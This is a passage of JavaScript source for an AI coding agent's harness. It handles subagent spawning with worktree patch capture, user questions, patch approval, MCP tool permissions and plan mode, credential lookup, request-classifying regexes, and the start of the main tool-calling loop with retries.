          parentRequestId: requestId,
          agent,
          subagentId,
          skillBlock,
          tools: AGENT_TOOLS.filter((t) => effective.includes(t.function.name)),
          maxTurns: agent.maxTurns,
          worktree,
        };

        // Capture the subagent's work as a reviewable patch BEFORE the
        // worktree is removed — otherwise isolation just means "discarded".
        // Only meaningful for a write-capable agent; a read-only one cannot
        // have produced changes.
        let capturedPatch = null;
        const capturePatch = async () => {
          if (!worktree || !agent.writeCapable) return null;
          try {
            const diff = await extractWorktreeDiff(ctx.runtime, worktree.path);
            if (!diff.ok) return { error: diff.error };
            if (diff.empty) return { empty: true };
            const summary = summarizeDiff(diff, root);
            const patchId = storePatch({
              subagentId, agentType: agent.name, sessionId, requestId,
              workspaceRoot: root, diff, summary,
            });
            return { patchId, summary };
          } catch (err) {
            return { error: String(err?.message || err) };
          }
        };

        const cleanupWorktree = async () => (worktree ? ctx.runtime.removeWorktree(worktree.worktreeId) : null);

        // ── background: true ───────────────────────────────────────────────
        // Returns immediately with a task id; the subagent keeps running on
        // its own promise chain while this turn continues.
        if (agent.background) {
          const started = startBackgroundSubagent({
            agentType: agent.name, subagentId, sessionId, requestId,
            worktreePath: worktree?.path || null,
            run: async (signal) => {
              const report = await runSubAgent({ ...spawnOpts, abortSignal: signal });
              // Capture inside the task, before onSettled removes the worktree.
              const captured = await capturePatch();
              return captured?.patchId
                ? { report, patch_id: captured.patchId, patch_summary: captured.summary }
                : report;
            },
            onSettled: cleanupWorktree,
          });
          if (!started.ok) {
            await cleanupWorktree();
            return { success: false, error: started.error };
          }
          return {
            success: true, background: true, task_id: started.taskId,
            agent_type: agent.name, tools_used: effective, model,
            isolation: agent.isolation, worktree: worktree?.path || null,
            message: `Started "${agent.name}" in the background as ${started.taskId}. Use subagent_status with this task_id to collect the report — do NOT wait idly for it.`,
          };
        }

        try {
          const report = await runSubAgent({ ...spawnOpts, abortSignal });
          capturedPatch = await capturePatch();
          return {
            success: true, report, agent_type: agent.name, tools_used: effective, model,
            isolation: agent.isolation, worktree: worktree?.path || null,
            ...(capturedPatch?.patchId
              ? {
                patch_id: capturedPatch.patchId,
                patch_summary: capturedPatch.summary,
                review_required: "The subagent's changes are NOT in your workspace yet. Review patch_summary, then call review_patch with action approve or reject.",
              }
              : capturedPatch?.empty ? { patch: "none — the subagent made no changes" }
                : capturedPatch?.error ? { patch_error: capturedPatch.error } : {}),
          };
        } finally {
          // Cleanup on success, error AND abort — always, patch or not.
          await cleanupWorktree();
        }
      }

      case "ask_user": {
        const question = String(args.question || "").trim();
        if (!question) return { success: false, error: "question is required" };
        if (!askUser) return { success: false, error: "Asking the user isn't available in this context — make your best judgment call and note the assumption in your final summary." };
        const options = Array.isArray(args.options)
          ? args.options.map((o) => ({ label: String(o?.label || "").slice(0, 80), description: String(o?.description || "").slice(0, 200) })).filter((o) => o.label).slice(0, 4)
          : [];
        // Already answered in THIS active session? Reuse it instead of asking
        // again. Answers live in dedicated per-session runtime state — never
        // inferred from memory text — so recalling a similar past topic can
        // never fabricate an answer the user didn't give this session.
        const asked = getAnsweredQuestion(sessionId, question);
        if (asked) {
          return { success: true, answer: asked.answer, reused: true, askedAt: asked.at };
        }

        emit?.({ type: "progress", stage: "planning", message: `❓ ${question.slice(0, 140)}` });
        try {
          const answer = await askUser({ question, header: String(args.header || "").slice(0, 20), options });
          recordAnsweredQuestion(sessionId, question, answer);
          return { success: true, answer };
        } catch (err) {
          // A cancelled question is NOT an answer — nothing is recorded, so a
          // later attempt genuinely re-asks rather than reusing a non-answer.
          return { success: false, error: `Question cancelled: ${String(err?.message || err)}` };
        }
      }

      case "review_patch": {
        const patchId = String(args.patch_id || "").trim();
        const action = String(args.action || "").trim().toLowerCase();
        if (!patchId) return { success: true, patches: listPatches(sessionId) };

        const record = getPatch(patchId);
        if (!record) return { success: false, error: `Unknown patch "${patchId}".` };

        if (!action || action === "diff") {
          return { success: true, ...record, diff: getPatchDiff(patchId) };
        }
        if (action === "approve") {
          // Apply is a real workspace mutation, so it obeys plan mode.
          if (permissionMode === "plan") {
            return { success: false, error: "Plan mode — patches cannot be applied. Present the review as text instead." };
          }
          const res = await applyPatch(patchId, { workspaceRoot: root, runtime: ctx.runtime });
          if (!res.ok) return { success: false, error: res.error, blocked: !!res.blocked };
          for (const f of res.files) ctx.editedFiles.set(f, "edit");
          emit?.({ type: "progress", stage: "executing", message: `✅ applied patch ${patchId} (${res.files.length} file(s))` });
          return { success: true, applied: true, files: res.files };
        }
        if (action === "reject") {
          const res = rejectPatch(patchId, args.reason);
          if (!res.ok) return { success: false, error: res.error };
          return { success: true, rejected: true, workspace: "unchanged" };
        }
        return { success: false, error: `Unknown action "${action}" — use diff, approve or reject.` };
      }

      case "subagent_status": {
        const taskId = String(args.task_id || "").trim();
        if (!taskId) {
          return { success: true, tasks: listBackgroundTasks(sessionId) };
        }
        const task = getBackgroundTask(taskId);
        if (!task) return { success: false, error: `Unknown background task "${taskId}".` };
        return { success: true, ...task };
      }

      case "read_mcp_resource": {
        const uri = String(args.uri || "").trim();
        if (!uri) return { success: false, error: "uri is required" };
        emit?.({ type: "progress", stage: "exploring", message: `🔌 resource: ${uri.slice(0, 80)}` });
        return await readMcpResource(uri, {
          mcpClients: ctx.mcpClients,
          serverName: args.server ? String(args.server) : null,
        });
      }

      default:
        // Tools contributed by an MCP server the project attached. They are
        // namespaced `mcp__<server>__<tool>` at discovery, so anything with
        // that prefix routes to the owning server rather than being unknown.
        if (isMcpToolName(name)) {
          if (mcpToolDenied(name, permissions)) {
            return { success: false, error: `"${name}" is blocked by this workspace's permission rules (.kodo/settings.json "deny").` };
          }
          if (permissionMode === "plan") {
            return { success: false, error: "Plan mode — external MCP tools are disabled. Present your plan as text instead." };
          }
          if (mcpToolNeedsApproval(name, permissions)) {
            const verdict = await resolveApproval(ctx, {
              kind: "mcp_tool",
              subject: name,
              question: `This workspace requires approval before running the MCP tool:\n\n${name}\n\nArguments: ${JSON.stringify(args).slice(0, 300)}`,
              header: "Run MCP tool?",
              payload: { args },
            });
            if (!verdict.approved) return { success: false, error: verdict.error };
          }
          emit?.({ type: "progress", stage: "executing", message: `🔌 ${name}` });
          return await callMcpTool(name, args, { routes: ctx.mcpRoutes, mcpClients: ctx.mcpClients });
        }
        return { success: false, error: `Unknown tool: ${name}` };
    }
  } catch (err) {
    return { success: false, error: String(err?.message || err) };
  }
}

// ── Credentials ───────────────────────────────────────────────────────────────

export async function resolveCreds(modelRoute) {
  if (modelRoute?.ok && modelRoute?.apiKey && modelRoute?.model) {
    return { apiKey: modelRoute.apiKey, baseURL: modelRoute.baseUrl || "https://api.openai.com/v1", model: modelRoute.model };
  }
  try {
    const s = JSON.parse(await fs.readFile(path.join(__dirname, "../../data/settings.json"), "utf-8"));
    if (s?.textApiKey && s?.textModel) return { apiKey: s.textApiKey, baseURL: s.textBaseUrl || "https://api.openai.com/v1", model: s.textModel };
    if (s?.apiKey && s?.model) return { apiKey: s.apiKey, baseURL: s.baseUrl || "https://api.openai.com/v1", model: s.model };
  } catch {}
  return {
    apiKey: process.env.OPENAI_API_KEY || "",
    baseURL: process.env.OPENAI_BASE_URL || "https://api.openai.com/v1",
    model: process.env.DEFAULT_MODEL || "gpt-4o-mini",
  };
}

// Deliberately NOT a fallback chain like resolveCreds above: vision
// escalation must stay OFF unless the user genuinely configured a
// vision-capable model (routeModel(settings, {hasImageAttachments:true})
// from services/modelRouter.mjs already validated capability via
// config/models.mjs's hasVision()). Falling back to the text model's creds
// or an env var here would silently "succeed" at a vision call against a
// model that was never confirmed to support images.
export function resolveVisionCreds(visionRoute) {
  if (visionRoute?.ok && visionRoute?.apiKey && visionRoute?.model) {
    return { apiKey: visionRoute.apiKey, baseURL: visionRoute.baseUrl || "https://api.openai.com/v1", model: visionRoute.model, provider: visionRoute.provider };
  }
  return null;
}

// Multi-step requests (numbered lists, several imperative verbs joined by
// "and"/"then"/"also") are exactly where the model tends to skip todo_write —
// nudging it explicitly in the seed message (not buried in the system prompt)
// measurably improves compliance without forcing a tool call we can't force.
const MULTI_STEP_RE = /(?:^|\n)\s*(?:\*{0,2}\d{1,2}[.)]|[-•])\s+\S/m;
function looksMultiStep(msg) {
  if (MULTI_STEP_RE.test(msg)) return true;
  const conjunctions = (msg.match(/\b(and|then|also|additionally)\b/gi) || []).length;
  return conjunctions >= 2;
}

// When the user explicitly asks to load skills, don't rely on the model
// remembering to call load_skill — preload every skill body directly into
// context so the instruction is honored even if tool-calling compliance slips.
const EXPLICIT_SKILL_LOAD_RE = /\bload\b[^.]{0,40}\bskills?\b|\ball\b[^.]{0,20}\bskills?\b|\bwhatever\b[^.]{0,20}\bskills?\b/i;

// A request to actually build/change something (so the agent must edit files,
// not print code). Excludes explicit "just show me the code / don't edit".
const BUILD_VERB_RE = /\b(add|create|make|build|implement|fix|refactor|rewrite|update|change|remove|delete|rename|move|improve|redesign|restyle|animate|install|wire|integrate|want|need|would\s+like|let'?s|should|apply|proceed|go\s+ahead|do\s+it|execute|yourself)\b/i;
const CODE_ONLY_RE = /\b(just\s+(show|give|tell|paste|write out)|don'?t\s+(edit|change|modify|touch|write|create|apply|implement)|how\s+(would|do|can|should)\s+i|show me the code|give me the code|what'?s the code|example of|snippet)\b/i;
function looksBuildRequest(msg) {
  const m = String(msg || "");
  if (CODE_ONLY_RE.test(m)) return false;
  return BUILD_VERB_RE.test(m);
}

// Questions about current/recent facts a model can't know reliably. Weak models
// answer these confidently from stale training data instead of calling
// web_search, so when detected we inject a forceful inline directive (models
// follow an explicit per-request instruction far better than a system-prompt
// rule). Deliberately broad — over-triggering a search is cheaper than shipping
// a confidently-wrong stale fact.
const TIME_SENSITIVE_RE = /\b(latest|newest|current(?:ly)?|recent(?:ly)?|last|this\s+(?:year|month|week)|nowadays|as\s+of|up[- ]?to[- ]?date|today|right\s+now)\b|\bwho\s+(?:is|are|won|holds|leads|owns|runs)\b|\bwhen\s+(?:is|was|will)\b|\bprice\s+of\b|\b(?:20[2-9]\d)\b|\bwinner\b|\bstandings?\b|\bversion\b/i;
export function looksTimeSensitive(msg) {
  return TIME_SENSITIVE_RE.test(String(msg || ""));
}

// TODAY'S DATE — computed fresh at request time and handed to the model so it
// knows what "now / latest / recent / this year" actually mean (its training
// cutoff is old). Used in the system prompt and the web-search directive.
export function currentDateLine() {
  const now = new Date();
  // Build the ISO date from LOCAL components (not toISOString, which is UTC) so
  // it matches the pretty local date and reflects the user's actual "today".
  const iso = `${now.getFullYear()}-${String(now.getMonth() + 1).padStart(2, "0")}-${String(now.getDate()).padStart(2, "0")}`;
  const pretty = now.toLocaleDateString("en-US", { weekday: "long", year: "numeric", month: "long", day: "numeric" });
  return `Today's date is ${iso} (${pretty}).`;
}

// The directive both nodes inject when a question looks time-sensitive. Includes
// today's date so the model frames queries and interprets "latest/recent"
// correctly. The "don't put a remembered year in the query" rule is critical:
// weak models otherwise anchor the search on their stale assumption (e.g.
// "last World Cup winner 2022"), confirming their wrong belief instead of
// discovering the actual latest answer.
export function webSearchDirective() {
  return `\n[${currentDateLine()} This question is about current, recent, or time-sensitive information. You MUST call web_search BEFORE answering — do NOT answer from memory, your training data is out of date and would be wrong. CRITICAL: do NOT put any year or date you remember into the search query — you are probably wrong about which is the latest. Search NEUTRALLY (e.g. "most recent World Cup winner", "latest Next.js stable version", "current Bitcoin price") and let the results tell you the year/answer. Judge "latest/recent" relative to today's date above. Then read the most authoritative result (fetch_url) and base your answer ONLY on what the search returned, not on what you thought you knew. Only skip searching if this is clearly about the user's own codebase.]`;
}
// Back-compat alias — some callers reference the constant name.
export const WEB_SEARCH_DIRECTIVE = webSearchDirective();

/**
 * Unfinished-work markers still present in the files this run edited.
 *
 * Only meaningful for a resume task, where a `TODO`/`FIXME` left behind in a
 * file the agent just edited is the previous author's own record of what was
 * still missing. Reads the real files rather than trusting the model's account
 * of what it wrote, and is bounded so a large run cannot turn the finish gate
 * into a full-tree scan.
 *
 * `@ts-` pragmas and eslint directives are deliberately excluded: they are
 * durable configuration, not unfinished work.
 */
// `\/\*+` and `\*+` rather than single characters so a JSDoc opener (`/** TODO`)
// and a continuation line (` * TODO`) are both recognised.
const MARKER_RE = /(?:^|\s)(?:\/\/+|\/\*+|\*+|#+|<!--)\s*(TODO|FIXME|XXX|HACK)\b[:\s]?(.*)$/i;
const MAX_MARKER_FILES = 24;

/**
 * Scan files the agent just edited for TODO/FIXME markers it left behind.
 *
 * Takes a RUNTIME, not a root: these are workspace source files the agent wrote,
 * so they must be read wherever the workspace actually lives. Reading them from
 * the host while the agent had been writing inside a container would report
 * markers from stale content — or none at all — and the completion check would
 * silently pass on evidence it never actually saw.
 */
export async function findUnresolvedMarkers(runtime, relPaths) {
  if (!runtime || typeof runtime.readFile !== "function") {
    throw new TypeError("findUnresolvedMarkers requires an ExecutionRuntime");
  }
  const out = [];
  for (const rel of relPaths.slice(0, MAX_MARKER_FILES)) {
    const content = await runtime.readFile(rel, 400_000);
    if (content === null) continue; // deleted or unreadable — nothing to resolve
    if (content.length > 400_000) continue;
    const lines = content.split("\n");
    for (let i = 0; i < lines.length; i++) {
      const m = MARKER_RE.exec(lines[i]);
      if (!m) continue;
      out.push({
        file: rel,
        line: i + 1,
        // Trailing comment terminators are noise in the directive the model reads.
        text: `${m[1].toUpperCase()}: ${String(m[2] || "").replace(/\s*(?:\*\/|-->)\s*$/, "").trim()}`.slice(0, 120),
      });
      if (out.length >= 20) return out;
    }
  }
  return out;
}

// ── Main node ─────────────────────────────────────────────────────────────────

export async function agentLoopNode(state) {
  const {
    workspacePath, userMessage, modelRoute, visionRoute, emit,
    rememberedTargetFile = "", sessionId, requestId,
    permissionMode = "auto", approvalPromise = null, abortSignal = null,
    askUser = null, priorMessages = [], priorConversation = [], recordEvent = null,
    runtime: providedRuntime = null,
  } = state;

  const runStartedAt = Date.now();
  const root = workspacePath || PROJECT_ROOT;
  const cleanMessage = String(userMessage).split(/conversation memory:/i)[0].trim();
  const memoryTail = String(userMessage).slice(cleanMessage.length).trim();

  emit?.({ type: "progress", stage: "exploring", message: permissionMode === "plan" ? "📐 Plan mode — exploring..." : "🤖 Agent working..." });

  const creds = await resolveCreds(modelRoute);
  const visionCreds = resolveVisionCreds(visionRoute);
  if (!creds.apiKey) {
    const msg = "No API key configured. Open Settings and add a model + API key.";
    emit?.({ type: "content", content: msg });
    return { finalAnswer: msg, editedFiles: [], messages: [new AIMessage(msg)] };
  }

  // The runtime is chosen by the caller (graph_runner → the CLI's --sandbox) and
  // defaults to this machine. It is created and started BEFORE anything reads
  // the workspace, because from here on every workspace read goes through it.
  //
  // loadKodoSettings/loadMemoryIndex/loadSkillIndex/loadSubagentRegistry stay
  // host-side: they are the CONFIGURATION that decides what the runtime may do
  // (permissions, hooks, which MCP servers may start), and consulting the
  // sandbox about the rules governing the sandbox would be circular. Everything
  // that is workspace CONTENT — the file tree, KODO.md, every file a tool
  // touches — goes through the runtime.
  const runtime = providedRuntime || new HostRuntime({ root });
  assertRuntime(runtime);
  await runtime.start();

  // Honest-fallback contract, case 2: workspace query + no workspace. Saying
  // "no workspace is connected" is only truthful when the root genuinely isn't
  // there — so it's established here, once, from the runtime itself, instead of
  // being guessed later by a model that failed a tool call.
  const rootStat = await runtime.stat("");
  if (!rootStat?.isDirectory) {
    const msg = `No workspace is currently connected (${root} is not an accessible directory). Connect a workspace and I'll inspect it.`;
    emit?.({ type: "content", content: msg });
    return { finalAnswer: msg, editedFiles: [], messages: [new AIMessage(msg)] };
  }

  const [workspaceSnapshot, memoryIndex, skillIndex, kodoSettings, kodoMd, subagentRegistry] = await Promise.all([
    runtime.walk("", 8),
    loadMemoryIndex(root),
    loadSkillIndex(root),
    loadKodoSettings(root),
    runtime.readFile("KODO.md", 24_000),
    loadSubagentRegistry(root),
  ]);
  for (const err of subagentRegistry.errors) console.warn(`[Subagent] ${err}`);
  const { hooks, permissions, mcpServers } = kodoSettings;

  // Seed context: files whose FULL relative path appears verbatim in the message
  // are certainly involved — preload them so the model doesn't spend a turn on it.
  const seedBlocks = [];
  const msgLower = cleanMessage.toLowerCase();
  const ctx = {
    root, emit, sessionId, requestId, hooks, permissions, mcpServers,
    // Every workspace read/write and every process launch in executeTool goes
    // through this. It is not optional and has no fallback: a tool that finds
    // ctx.runtime missing must fail loudly, not quietly use the host.
    runtime,
    editedFiles: new Map(),
    readFiles: new Set(),
    bashCommands: [], // every bash command actually run this turn — backs the anti-fabrication check below
    todosRef: { current: [] },
    workspaceSnapshot,
    permissionMode,
    askUser,
    creds,          // lets the spawn_agent tool run a nested sub-agent loop
    visionCreds,    // resolved below; lets verify_ui escalate a failure to a vision model
    isSubAgent: false,
    abortSignal,
    // Persists this run's tool calls/results as replayable working memory.
    // Injected by graph_runner (like emit/askUser) so this node stays free of
    // any DB dependency; absent in tests and sub-agents, where it no-ops.
    recordEvent,
    mcpClients: new Map(), // populated by MCP discovery + verify_ui; closed at the end of this run
    mcpRoutes: new Map(),  // "mcp__server__tool" → { serverName, toolName }
    // inspect → plan → patch → verify → finish. Observes every executed tool
    // call so the loop can tell a productive retry from a stuck one, and can
    // refuse to finish on unverified edits. Sub-agents get their own (they run
    // read-only, so it stays inert there).
    taskController: createTaskController({ task: cleanMessage }),
  };

  // ── Lifecycle hooks ────────────────────────────────────────────────────────
  // One dispatcher bound to this run's workspace, model and MCP connections, so
  // command/http/mcp_tool/prompt handlers all work without the loop knowing how
  // any of them execute. Absent config makes every call a cheap no-op.
  const hookConfig = normalizeHookConfig(hooks).hooks;
  ctx.fireHook = (event, payload, opts = {}) => fireHookEvent(event, payload, {
    config: hookConfig,
    cwd: root,
    signal: abortSignal,
    emit,
    // A project's `command` hooks run wherever the agent's other commands run.
    // PreToolUse/PostToolUse fire inside every tool call, so leaving these on
    // the host meant a sandboxed run executed project shell on the host
    // hundreds of times per task.
    runtime: ctx.runtime,
    deps: {
      callMcpTool: (tool, toolArgs) => callMcpTool(tool, toolArgs, { routes: ctx.mcpRoutes, mcpClients: ctx.mcpClients }),
      // A `prompt` hook is a single-turn evaluation with no tools — the
      // cheapest way to let a project express a judgement call in English.
      runPrompt: async ({ prompt }) => {
        const { message } = await chatWithTools({
          creds, system: "You evaluate a Kodo lifecycle event and reply concisely. If asked for a decision, reply with JSON only.",
          messages: [{ role: "user", content: prompt }],
          tools: [], maxTokens: 800, temperature: 0, thinking: false, signal: abortSignal || undefined,
        });
        return String(message?.content || "");
      },
      // An `agent` hook gets the read-only sub-agent (tools, multi-turn).
      runAgent: async ({ prompt }) => runSubAgent({
        task: prompt, root, creds, emit, hooks, permissions, workspaceSnapshot, abortSignal,
      }),
    },
    ...opts,
  });

  // Attach whatever MCP servers this project declared, and offer their tools
  // alongside the built-ins. Best-effort: an unavailable server is logged and
  // skipped, never fatal (see discoverMcpTools).
  const { tools: mcpTools, routes: mcpRoutes, servers: mcpServerStatus } = await discoverMcpTools({
    mcpServers, cwd: root, mcpClients: ctx.mcpClients, emit,
    // Lets discovery refuse HOST stdio servers when this run is sandboxed —
    // one such server would otherwise hand the agent a complete bypass.
    runtime,
    // Lets a server ask US to run a completion (sampling/createMessage) using
    // the same model this run is on, capped inside makeSamplingHandler.
    sampling: { chat: chatWithTools, creds },
    // Elicitation: a server asking the USER (not the model) for input. Routed
    // through the interaction manager so nothing is ever auto-answered.
    elicitation: { interactions, sessionId, fireHook: ctx.fireHook, signal: abortSignal },
  });
  ctx.mcpRoutes = mcpRoutes;

  // Resources are advertised, not auto-injected: the model reads one via
  // read_mcp_resource only if it wants it, so they cost nothing otherwise.
  const mcpResources = ctx.mcpClients.size ? await listMcpResources(ctx.mcpClients) : [];

  // Built after discovery so the prompt can name the servers that actually
  // came up (an unreachable one must not be advertised to the model).
  const systemPrompt = buildSystemPrompt({
    workspaceTree: workspaceSnapshot,
    kodoMd,
    memoryIndex,
    skillIndex,
    permissionMode,
    mcpServers: mcpServerStatus,
    mcpResources,
    subagents: [...subagentRegistry.agents.values()],
  });
  for (const f of workspaceSnapshot) {
    if (f.isDir || seedBlocks.length >= 3) continue;
    if (isSensitiveFilePath(f.path)) continue; // never auto-preload a secret file
    if (msgLower.includes(f.path.toLowerCase())) {
      safeResolve(root, f.path); // confinement check before it crosses the boundary
      const content = await ctx.runtime.readFile(f.path, MAX_FILE_BYTES);
      if (content && content.length < 60_000) {
        ctx.readFiles.add(f.path);
        seedBlocks.push(`<file path="${f.path}">\n${content}\n</file>`);
      }
    }
  }

  let preloadedSkills = "";
  if (EXPLICIT_SKILL_LOAD_RE.test(cleanMessage) && skillIndex.length) {
    const bodies = [];
    for (const s of skillIndex.slice(0, 6)) {
      try {
        const raw = await fs.readFile(s.file, "utf-8");
        bodies.push(`<skill name="${s.name}">\n${parseSkillFrontmatter(raw).body.slice(0, 2500)}\n</skill>`);
      } catch { /* skip unreadable */ }
    }
    if (bodies.length) {
      preloadedSkills = `\n\n[Auto-preloaded skills — you asked to load available skills; apply this guidance directly, no need to call load_skill again]\n${bodies.join("\n\n")}`;
    }
  }

  const firstUserMsg = [
    cleanMessage,
    rememberedTargetFile ? `\n[Context: the user most recently worked on "${rememberedTargetFile}"]` : "",
    memoryTail ? `\n[Session context]\n${memoryTail.slice(0, 1500)}` : "",
    seedBlocks.length ? `\n[Preloaded files referenced in the request]\n${seedBlocks.join("\n\n")}` : "",
    looksMultiStep(cleanMessage) ? "\n[This request has multiple distinct steps — call todo_write with the full breakdown before making any edits, and keep it updated as you complete each step.]" : "",
    looksTimeSensitive(cleanMessage) ? webSearchDirective() : "",
    preloadedSkills,
  ].filter(Boolean).join("\n");

  // The real execution history goes in front of this turn's task, so the model
  // can see what it already attempted, read, edited and broke — instead of
  // re-deriving it. `priorConversation` is the replayed tool timeline (built by
  // services/conversationStore.mjs from persisted turn_events); `priorMessages`
  // is the text-only fallback used when no event history exists yet (sessions
  // that predate the timeline, or an unrecorded run).
  const priorTurns = priorConversation.length ? priorConversation : buildPriorTurns(priorMessages);
  const conversation = [...priorTurns, { role: "user", content: firstUserMsg }];
  // Everything up to and including this turn's task must survive compaction.
  const pinnedPrefix = conversation.length;
  if (priorTurns.length) {
    console.log(`[AgentLoop] resumed ${priorTurns.length} prior message(s) (${priorConversation.length ? "tool timeline" : "text fallback"})`);
  }
  ctx.recordEvent?.({ kind: "user", content: cleanMessage });
  const usage = { inputTokens: 0, outputTokens: 0, llmCalls: 0 };
  // Set when the provider itself gave up (auth, quota, persistent 5xx) rather
  // than the task going badly. Observability only — no behaviour branches on it.
  let providerError = null;
  // write_file/edit_file are hard-rejected at the executor in plan mode
  // (see the "case edit_file"/"case write_file" guards below) — their only
  // possible outcome there is an error telling the model to stop, so their
  // schemas are pure wasted tokens on every iteration of a plan-mode run.
  // Everything else (bash, read tools, verify_ui, etc.) still behaves
  // normally in plan mode, so stays in the list.
  // MCP tools act on external systems (issue trackers, databases, browsers),
  // so plan mode withholds them for the same reason it withholds edits — and
  // omitting the schemas entirely keeps them from costing tokens every
  // iteration of a read-only run.
  const PLAN_MODE_BLOCKED_TOOLS = new Set(["write_file", "edit_file"]);
  // read_mcp_resource is only meaningful when a connected server actually
  // publishes resources — otherwise its schema is dead weight every iteration.
  const hasBackgroundAgent = [...subagentRegistry.agents.values()].some((a) => a.background);
  const baseTools = AGENT_TOOLS.filter((t) => {
    if (t.function.name === "read_mcp_resource") return mcpResources.length > 0;
    // Dead weight on every iteration unless a background agent is defined.
    if (t.function.name === "subagent_status") return hasBackgroundAgent;
    if (t.function.name === "review_patch") {
      return [...subagentRegistry.agents.values()].some((a) => a.isolation === "worktree" && a.writeCapable);
    }
    return true;
  });
  const toolsForThisRun = permissionMode === "plan"
    ? baseTools.filter((t) => !PLAN_MODE_BLOCKED_TOOLS.has(t.function.name))
    : [...baseTools, ...mcpTools];
  // Exactly the names the model was offered — what tool-call sanitising must
  // accept, so a discovered MCP tool isn't discarded as "unknown".
  const validToolNames = new Set(toolsForThisRun.map((t) => t.function.name));
  // Subagent tool composition intersects against this, so a definition can
  // never grant something this run does not itself hold.
  ctx.validToolNames = validToolNames;

  // One tool-calling turn loop, reused for both the main pass and the bounded
  // post-verification fix-up pass — same LLM-call/tool-execution/context-trim
  // logic, parameterized only by iteration budget and whether the ask-mode
  // approval gate is still active (it's already past by the time a fix-up runs).
  async function runToolLoop({ iterationBudget, approvalState, nudgeOnStall = false }) {
    let iteration = 0;
    let consecutiveErrors = 0;
    let stallNudged = false;     // only nudge once per loop
    let stoppedEarly = false;    // controller ended the task before the budget
    let finalAnswer = "";
    const onChunk = (chunk) => emit?.({ type: "content", content: chunk });

    while (iteration < iterationBudget) {
      if (abortSignal?.aborted) { finalAnswer = "Operation cancelled."; break; }
      iteration++;

      let message, callUsage;
      // Streaming only produces visible chunks for narrative TEXT — a turn
      // that's purely generating a large tool call (e.g. a big write_file)
      // emits nothing via onChunk while it's happening, even though the
      // provider is actively working. Combined with a "thinking"-model
      // client timeout as long as 10 minutes (see agentChat.mjs), that turn
      // looks completely indistinguishable from hung: no new step, no
      // content, for minutes at a time. This heartbeat doesn't detect real
      // hangs (it can't — it doesn't know what the provider is doing), it
      // just makes legitimate slow generation visibly ALIVE instead of
      // silent, so "still working" and "actually stuck" stop looking
      // identical from the outside.
      const heartbeatStartedAt = Date.now();
      const heartbeat = setInterval(() => {
        const elapsed = Math.round((Date.now() - heartbeatStartedAt) / 1000);
        emit?.({ type: "progress", stage: "thinking", message: `⏳ still working on this step... (${elapsed}s)` });
      }, 12_000);
      try {
        ({ message, usage: callUsage } = await chatWithTools({
          creds,
          system: systemPrompt,
          messages: conversation,
          tools: toolsForThisRun,
          // A real component file (or several batched into one turn) can
          // easily need more than 8k output tokens once JSON-escaped —
          // hitting the cap mid-generation truncates the tool call's
          // arguments, which used to be the actual root cause behind the
          // model abandoning write_file for bash heredoc workarounds on
          // large multi-file builds. Not unlimited — still bounded, still
          // caught (and now clearly explained) by the parse-error sentinel
          // in normalizeArgumentsJSON if a provider's real ceiling is lower.
          maxTokens: 16_000,
          temperature: 0,
          signal: abortSignal || undefined,
          onChunk,
          // The main tool-calling loop is mechanical decision-making (which
          // tool, which args) repeated up to MAX_ITERATIONS times per run —
          // not the kind of open-ended reasoning "thinking mode" is for.
          // Explicit, not a name guess: see the note in agentChat.mjs — some
          // providers default this on server-side regardless of model name.
          thinking: false,
        }));
        usage.inputTokens += callUsage?.inputTokens || 0;
        usage.outputTokens += callUsage?.outputTokens || 0;
        usage.llmCalls++;
        // Duration is the whole reason the heartbeat above exists: reconstructing
        // this after the fact from unrelated log lines (frontend polling, etc.)
        // is exactly the manual timestamp archaeology that made a real production
        // log painful to diagnose. Log it directly instead.
        console.log(`[AgentLoop] ${iteration}/${iterationBudget} LLM call took ${Date.now() - heartbeatStartedAt}ms (${callUsage?.inputTokens || 0}in/${callUsage?.outputTokens || 0}out tokens, ${message.tool_calls?.length || 0} tool call(s))`);
      } catch (err) {
        if (abortSignal?.aborted) { finalAnswer = "Operation cancelled."; break; }
        const errStr = String(err?.message || err);
        console.warn(`[AgentLoop] LLM error (iter ${iteration}, after ${Date.now() - heartbeatStartedAt}ms):`, errStr.slice(0, 200));
        // Includes stream/connection-abort signatures ("BodyStreamBuffer was
        // aborted", "premature close", "socket hang up") — these are the
        // underlying HTTP client tearing down a connection mid-read (e.g. a
        // slow "thinking" model going quiet long enough to trip a transport
        // timeout — see the undici dispatcher in agentChat.mjs, which raises
        // that ceiling but doesn't guarantee it never happens), not a
        // permanent failure. They used to fall straight through to "provider
        // failed, try again" on the first occurrence instead of getting the
        // same retry-with-backoff treatment as every other transient error.
        // Delegated to the transport layer, which is the only place that can see
        // what actually broke: the OpenAI SDK reports every transport failure as
        // the bare string "Connection error." and hides UND_ERR_SOCKET / "other
        // side closed" in `err.cause`. Matching on `errStr` alone classified a
        // dropped socket as permanent, so this retry never ran and a single
        // idle-connection blip killed a 15-iteration run outright.
        // `overloaded` stays here: it is provider prose with no status attached.
        const isTransient = isTransientTransportError(err) || /\boverloaded\b/i.test(errStr);
        // A 400 / "Extra data" / context-length error usually means the request
        // got too big (many fetches). Aggressively shrink old tool outputs and
        // retry once — the same request would just fail again otherwise.
        const looksTooBig = /\b400\b|extra data|context length|maximum context|too long|token|payload too large|413/i.test(errStr);
        consecutiveErrors++;
        if (isTransient && consecutiveErrors < 3) {
          await new Promise((r) => setTimeout(r, 800 * consecutiveErrors));
          iteration--; // transient failures don't consume budget
          continue;
        }
        if (looksTooBig && consecutiveErrors < 3 && conversationChars(conversation) > CONV_CHAR_BUDGET_TIGHT) {
          const before = conversationChars(conversation);
          shrinkOldToolOutputs(conversation, CONV_CHAR_BUDGET_TIGHT, 4);
          console.warn(`[AgentLoop] request too large — shrank context ${before}→${conversationChars(conversation)} chars and retrying`);
          iteration--; // recovery retry doesn't consume budget
          continue;
        }
        // Recorded BEFORE the synthesis fallback below, not only on the
        // terminal path. The provider has already failed at this point; whether
        // a salvage call happens to succeed changes what the USER sees, not
        // whether the run was cut short. Setting it only on the terminal path
        // let the more misleading case through: a run that died on iteration 3
        // came back with a confident prose answer, no edits, and scored
        // `partial` — indistinguishable from an agent that chose to explain
        // instead of act. It was a provider outage, and the report said the
        // agent under-delivered.
        providerError = { message: errStr.slice(0, 300), attempts: consecutiveErrors, salvaged: false };

        // Graceful degradation: the provider broke mid-loop (common with weak
        // OpenAI-compatible providers on multi-turn tool use). Rather than
        // returning "provider failed", make ONE clean, small, no-tools call to
        // synthesize an answer from whatever we already gathered.
        if (iteration > 1 && conversation.some((m) => m.role === "tool")) {
          try {
            emit?.({ type: "progress", stage: "answering", message: "⚙️ Provider hiccup — writing the answer from what I found..." });
